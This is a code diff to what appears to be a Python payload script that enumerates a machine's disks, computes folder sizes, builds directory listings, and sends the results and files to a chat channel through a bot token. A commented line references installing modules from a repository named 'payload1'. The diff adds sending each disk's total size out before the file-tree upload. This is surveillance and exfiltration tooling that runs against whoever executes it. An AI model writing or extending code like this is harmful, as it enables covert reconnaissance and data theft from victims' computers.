@@ -124,6 +124,23 @@ def scan_disks(parameter):
                     disks.append(letterpath)
     return disks
 
+def get_folder_size(folder_path):
+    total_size = 0
+    try:
+        for entry in os.scandir(folder_path):
+            try:
+                if entry.is_file(follow_symlinks=False):
+                    total_size += entry.stat(follow_symlinks=False).st_size
+                elif entry.is_dir(follow_symlinks=False):
+                    total_size += get_folder_size(entry.path)
+            except (PermissionError, FileNotFoundError, OSError) as e:
+                print(f"Unable to access to {entry.path}: {e}")
+                continue
+    except (PermissionError, FileNotFoundError, OSError) as e:
+        print(f"Unable to access to {folder_path}: {e}")
+        pass
+    return total_size
+
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
@@ -132,8 +149,9 @@ def scan_disks(parameter):
 #Param 2 : for no OS disks
 disks = scan_disks(1)
 
-#For disk in list : tree function --> send file created --> send message
+#For disk in list : send disk infos --> tree function --> send file created
 for disks in disks:
+    total_size = get_folder_size(disks)
+    send_message(chat_id, token, disks + " : " + str(total_size))
     disk, temp_file_path = process_path(chat_id, token, disks)
-    send_message(chat_id, token, disk)
     send_file(chat_id, token, temp_file_path)
